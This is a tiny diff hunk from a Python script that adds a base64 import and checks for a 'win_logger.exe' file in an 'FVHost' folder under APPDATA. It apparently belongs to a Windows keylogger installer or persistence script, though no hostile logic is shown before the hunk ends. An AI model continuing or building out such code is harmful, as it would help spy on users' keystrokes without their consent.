@@ -19,6 +19,7 @@ import sys
 import time
 import getpass
 import shutil
+import base64
 
 if os.path.exists(os.environ["appdata"] +'\\FVHost'+'\\win_logger.exe'):
      
